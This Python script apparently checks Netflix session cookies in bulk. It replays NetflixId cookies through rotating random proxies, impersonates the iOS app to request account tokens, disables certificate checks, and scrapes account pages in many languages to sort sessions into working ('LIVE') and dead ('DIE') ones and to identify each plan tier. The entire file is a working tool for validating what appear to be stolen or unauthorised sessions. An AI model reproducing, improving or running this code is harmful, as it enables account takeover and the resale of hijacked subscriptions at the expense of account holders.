import requests
import time
import json
import re
from datetime import datetime
import proxies_list
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

NETFLIX_API_URL = "https://ios.prod.ftl.netflix.com/nq/mobile/nqios/~15.48.0/user"

# Global flag: once we know API is dead, skip it entirely to save time
_api_is_dead = False

PAYMENT_DIE_KEYWORDS = [
    "paymentupdate", "payment-update", "billing-update",
    "your account is on hold", "membership is on hold", "account is on hold",
    "reactivar la suscripción", "reactivar tu suscripción", "reactivar suscripción",
    "cập nhật thanh toán", "cập nhật phương thức thanh toán", "cập nhật thông tin thanh toán",
    "tài khoản bị tạm hoãn", "tài khoản bị tạm dừng", "không thể xử lý khoản thanh toán",
    "zaktualizuj metodę płatności", "restart your membership", "update your payment",
    "update your billing information", "update billing", "we were unable to process your payment",
    "actualiza tu información de pago", "actualizar información de pago",
    "atualize sua forma de pagamento", "renovar assinatura", "reiniciar membresía", "reiniciar membresia",
    "aggiorna i dati di pagamento", "mise à jour de votre mode de paiement", "ödeme bilgilerinizi güncelleyin", 
    "aktualisieren sie ihre zahlungsart", "reaktivera ditt medlemskap", "renouveler votre abonnement",
    "suspension de votre compte", "cuenta suspendida", "payment is required",
    "membershipstatus\":\"rejoin", "membershipstatus\":\"former_member",
    "membershipstatus\":\"never_member", "ismembershipactive\":false", "finish sign-up", "hoàn tất đăng ký",
    "choose a plan", "choose your plan", "membership paused", "membership is paused",
    "warnuserofpaymentfailure", "ispaymentfailure", "payment_failure", "payment_hold", "paymenthold"
]

def normalize_plan_name(raw_plan_name, fallback_text=""):
    import unicodedata
    import re
    
    # 1. Nếu đã trích xuất được plan_name cụ thể từ JSON / Metadata (e.g. "Premium", "Standard", "Cao cấp", "Standard with Ads")
    if raw_plan_name and str(raw_plan_name).strip():
        # Loại bỏ các ký tự vô hình zero-width (\ufeff, \u200b, v.v.)
        raw_str = re.sub(r'[\ufeff\u200b\u200c\u200d\u200e\u200f\xa0]', '', str(raw_plan_name)).strip()
        p_clean = unicodedata.normalize('NFKD', raw_str.lower()).encode('ASCII', 'ignore').decode('utf-8')
        
        # Nhận diện Ads trước (trên tất cả ngôn ngữ)
        if any(kw in p_clean for kw in ['ads', 'advert', 'anuncio', 'pub', 'werbung', 'quang cao', 'reklam', 'iklan', 'publicit']):
            return "Standard with Ads"
        elif any(kw in raw_str for kw in ['広告つきスタンダード', '広告']):
            return "Standard with Ads"
            
        # Nhận diện Premium (trên tất cả ngôn ngữ)
        if any(kw in p_clean for kw in ['premium', 'ultra', '4k', '4-screen', 'cao cap', 'ozel', 'premjum']):
            return "Premium"
        elif any(kw in raw_str for kw in ['المميزة', 'プレミアム', 'Cao cấp']):
            return "Premium"
            
        # Nhận diện Standard (trên tất cả ngôn ngữ)
        if any(kw in p_clean for kw in ['standard', 'estandar', 'standardowy', 'padrao', 'hd', 'standar', 'tieu chuan']):
            return "Standard"
        elif any(kw in raw_str for kw in ['القياسية', 'スタンダード', 'Tiêu chuẩn']):
            return "Standard"
            
        # Nhận diện Basic & Mobile
        if any(kw in p_clean for kw in ['basic', 'basico', 'podstawowy', 'co ban', 'temel', 'mobil']):
            return "Basic"
        elif any(kw in raw_str for kw in ['ベーシック', 'Cơ bản']):
            return "Basic"
            
        return raw_str
        
    # 2. Fallback: Tìm trong các cụm từ gói cước chính xác từ HTML/JSON response
    if fallback_text:
        text_orig = str(fallback_text)
        text_clean = unicodedata.normalize('NFKD', text_orig.lower()).encode('ASCII', 'ignore').decode('utf-8')
        
        if any(kw in text_clean for kw in ['"standard with ads"', '"standard_ads"', 'standard with ads', 'standard con anuncios', 'standard z reklamami', 'standard avec pub', 'reklam iceren', 'standar dengan iklan']):
            return "Standard with Ads"
        elif any(kw in text_orig for kw in ['広告つきスタンダード']):
            return "Standard with Ads"
        elif any(kw in text_clean for kw in ['"premium"', 'plan: premium', 'premium plan', 'ultra hd', '4k uhd', 'cao cap']):
            return "Premium"
        elif any(kw in text_orig for kw in ['المميزة', 'プレミアム']):
            return "Premium"
        elif any(kw in text_clean for kw in ['"standard"', 'plan: standard', 'standard plan', 'standardowy', 'padrao', 'tieu chuan']):
            return "Standard"
        elif any(kw in text_orig for kw in ['القياسية', 'スタンダード']):
            return "Standard"
        elif any(kw in text_clean for kw in ['"basic"', 'plan: basic', 'podstawowy', 'co ban', 'basico', 'mobile']):
            return "Basic"
        elif any(kw in text_orig for kw in ['ベーシック']):
            return "Basic"
            
    return "Premium"

def is_date_expired(date_str):
    if not date_str or str(date_str).strip() in ['N/A', 'None', '', 'null']:
        return False
    
    clean_str = str(date_str).strip()
    now = datetime.now()
    
    # 1. ISO format YYYY-MM-DD
    iso_match = re.search(r'(\d{4})[-/.](\d{1,2})[-/.](\d{1,2})', clean_str)
    if iso_match:
        try:
            dt = datetime(int(iso_match.group(1)), int(iso_match.group(2)), int(iso_match.group(3)))
            return dt.date() < now.date()
        except Exception:
            pass

    # 2. DMY format DD-MM-YYYY
    dmy_match = re.search(r'(\d{1,2})[-/.](\d{1,2})[-/.](\d{4})', clean_str)
    if dmy_match:
        try:
            dt = datetime(int(dmy_match.group(3)), int(dmy_match.group(2)), int(dmy_match.group(1)))
            return dt.date() < now.date()
        except Exception:
            pass

    # 3. Multi-language month names
    months = {
        'january': 1, 'styczeń': 1, 'stycznia': 1, 'jan': 1, 'enero': 1, 'janeiro': 1, 'januar': 1,
        'february': 2, 'luty': 2, 'lutego': 2, 'feb': 2, 'febrero': 2, 'fevereiro': 2, 'februar': 2,
        'march': 3, 'marzec': 3, 'marca': 3, 'mar': 3, 'marzo': 3, 'março': 3, 'märz': 3,
        'april': 4, 'kwiecień': 4, 'kwietnia': 4, 'apr': 4, 'abril': 4,
        'may': 5, 'maj': 5, 'maja': 5, 'mayo': 5, 'maio': 5, 'mai': 5,
        'june': 6, 'czerwiec': 6, 'czerwca': 6, 'jun': 6, 'junio': 6, 'junho': 6, 'juni': 6,
        'july': 7, 'lipiec': 7, 'lipca': 7, 'jul': 7, 'julio': 7, 'julho': 7, 'juli': 7,
        'august': 8, 'sierpień': 8, 'sierpnia': 8, 'agustus': 8, 'aug': 8, 'agosto': 8,
        'september': 9, 'wrzesień': 9, 'września': 9, 'sep': 9, 'septiembre': 9, 'setiembre': 9, 'setembro': 9,
        'october': 10, 'październik': 10, 'października': 10, 'oct': 10, 'octubre': 10, 'outubro': 10, 'oktober': 10,
        'november': 11, 'listopad': 11, 'listopada': 11, 'nov': 11, 'noviembre': 11, 'novembro': 11,
        'december': 12, 'grudzień': 12, 'grudnia': 12, 'dec': 12, 'diciembre': 12, 'dezembro': 12, 'dezember': 12
    }

    words = re.findall(r'[a-zA-Záéíóúñąćęłńóśźżäöü]+|\d+', clean_str.lower())
    year, month, day = None, None, None

    for w in words:
        if w.isdigit():
            val = int(w)
            if 1900 < val < 2100:
                year = val
            elif 1 <= val <= 31 and day is None:
                day = val
        elif w in months and month is None:
            month = months[w]

    if month and day:
        if not year:
            # Nếu không có năm, kiểm tra nếu tháng < tháng hiện tại thì là năm sau
            if month < now.month:
                year = now.year + 1
            else:
                year = now.year
        try:
            dt = datetime(year, month, day)
            return dt.date() < now.date()
        except Exception:
            pass

    return False

def check_web_account_status_and_plan(cookies, proxy_dict):
    """
    Returns (status, plan) where status is 'LIVE', 'DIE', or 'ERROR'.
    Thoroughly checks URL redirects and full HTML body for Payment Holds & Dead accounts.
    """
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        response = requests.get(
            "https://www.netflix.com/YourAccount",
            cookies=cookies,
            headers=headers,
            proxies=proxy_dict,
            allow_redirects=True,
            timeout=15,
            verify=False
        )
        url_lower = response.url.lower()
        html = response.text
        text_lower = html.lower()
        
        # 1. Chuyển hướng về Login, ClearCookies, hoặc Signup -> DIE (Cookie hết hạn)
        if "netflix.com/login" in url_lower or "/clearcookies" in url_lower or "/signup" in url_lower:
            return "DIE", None
            
        # 2. URL chứa trang cập nhật thanh toán -> DIE (Lỗi Payment)
        if any(kw in url_lower for kw in ["paymentupdate", "payment-update", "billing-update", "simplemember"]):
            return "DIE", None
            
        # 3. Nội dung HTML chứa thông báo lỗi thanh toán / tạm hoãn / hết hạn -> DIE
        if any(kw in text_lower for kw in PAYMENT_DIE_KEYWORDS):
            return "DIE", None
            
        # 4. Kiểm tra ngày hết hạn
        date_m = re.search(r'nextBillingDate"\s*:\s*\{"fieldType":"String","value":"([^"]+)"\}', html)
        if date_m:
            expire_date = date_m.group(1).replace(r'\x20', ' ').strip()
            if is_date_expired(expire_date):
                return "DIE", None

        # 5. Kiểm tra gói cước nếu còn sống (LIVE)
        plan_raw = None
        plan_m = re.search(r'(?:localizedPlanName|planName)"\s*:\s*\{"fieldType":"String","value":"([^"]+)"\}', html)
        if plan_m:
            plan_raw = plan_m.group(1).replace(r'\x20', ' ').strip()
            try:
                import codecs
                plan_raw = codecs.decode(plan_raw, 'unicode_escape')
            except Exception:
                pass
                
        final_plan = normalize_plan_name(plan_raw, text_lower)
        return "LIVE", final_plan
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError):
        return "ERROR", None
    except Exception as e:
        print(f"Web Check Error: {e}")
        return "ERROR", None

def check_account_live(netflix_id, secure_netflix_id="", check_payment=True):
    """
    Kiem tra toan dien ca Token API va Web HTML.
    Chi tra ve LIVE khi tai khoan thuc su tao duoc Token VA khong bi loi thanh toan.
    Co co che retry tu dong khi proxy gap loi ket noi.
    """
    cookies = {"NetflixId": netflix_id}
    if secure_netflix_id:
        cookies["SecureNetflixId"] = secure_netflix_id
    
    proxy_dict = proxies_list.get_random_proxy()
    
    # 1. Kiem tra kha nang tao Token dang nhap truc tiep
    plan_api = _get_token_and_plan_api(netflix_id, secure_netflix_id, proxy_dict)
    
    # Retry voi Proxy moi neu bi loi mang/proxy
    if plan_api == "ERROR":
        proxy_dict = proxies_list.get_random_proxy()
        plan_api = _get_token_and_plan_api(netflix_id, secure_netflix_id, proxy_dict)
        
    if plan_api is None:
        return "DIE", None
    elif plan_api == "API_DEAD" or plan_api == "ERROR":
        # API khong phan hoi, thu kiem tra qua Web
        web_status, web_plan = check_web_account_status_and_plan(cookies, proxy_dict)
        if web_status == "ERROR":
            proxy_dict = proxies_list.get_random_proxy()
            web_status, web_plan = check_web_account_status_and_plan(cookies, proxy_dict)
        return web_status, web_plan
        
    # 2. Kiem tra trang Web YourAccount de tranh loi Payment Hold
    if check_payment:
        web_status, web_plan = check_web_account_status_and_plan(cookies, proxy_dict)
        if web_status == "ERROR":
            proxy_dict = proxies_list.get_random_proxy()
            web_status, web_plan = check_web_account_status_and_plan(cookies, proxy_dict)
            
        if web_status == "DIE":
            return "DIE", None
        elif web_status == "LIVE":
            final_plan = web_plan if web_plan else (plan_api if plan_api != "VALID" else "Premium")
            return "LIVE", final_plan
        elif web_status == "ERROR":
            # Neu web gap loi mang sau khi da co Token tu API, coi nhu van co the dung duoc hoac bao ERROR
            return "LIVE", plan_api if plan_api != "VALID" else "Premium"
            
    return "LIVE", plan_api if plan_api != "VALID" else "Premium"


def _get_token_and_plan_api(netflix_id, secure_netflix_id="", proxy_dict=None):
    params = {
        "falcor_server": "0.1.0",
        "withSize": "true",
        "materialize": "true",
        "path": '["account","token","default"]',
        "original_path": "/nq/mobile/nqios/~15.48.0/user"
    }
    cookie_str = f"NetflixId={netflix_id}"
    if secure_netflix_id:
        cookie_str += f"; SecureNetflixId={secure_netflix_id}"

    headers = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "Cookie": cookie_str,
        "x-netflix.client.type": "argo",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.request.routing.original.path": "/nq/mobile/nqios/~15.48.0/user",
        "accept-language": "en-US;q=1"
    }
    try:
        response = requests.get(
            NETFLIX_API_URL,
            params=params,
            headers=headers,
            proxies=proxy_dict,
            timeout=15,
            verify=False
        )
        if response.status_code == 404:
            return "API_DEAD"
        if response.status_code in [403, 429] or response.status_code >= 500:
            return "ERROR"
        if not response.ok:
            return None
        data = response.json()
        data_str = json.dumps(data).lower()
        exact_die_indicators = [
            "\"on_hold\"", "\"canceled\"", "\"former_member\"", "\"never_member\"",
            "\"cancelled\"", "\"delinquent\"", "\"status\":\"hold\"", "\"status\":\"inactive\"",
            "\"payment_failure\"", "\"warnuserofpaymentfailure\":true", "\"ispaymentfailure\":true",
            "\"payment_update\"", "\"paymenterror\"", "\"account_on_hold\"", "\"hold_payment\"",
            "\"membershipstatus\":\"anonymous\"", "\"membershipstatus\":\"former_member\"",
            "\"membershipstatus\":\"never_member\"", "\"ismembershipactive\":false"
        ]
        for indicator in exact_die_indicators:
            if indicator in data_str:
                return None
        token_data = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        if isinstance(token_data, dict):
            token = token_data.get("token")
        elif isinstance(token_data, str):
            token = token_data
        else:
            token = None
            
        if not token:
            return None
            
        return normalize_plan_name("", data_str)
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError):
        return "ERROR"
    except Exception as e:
        print(f"Token API error: {e}")
        return "ERROR"
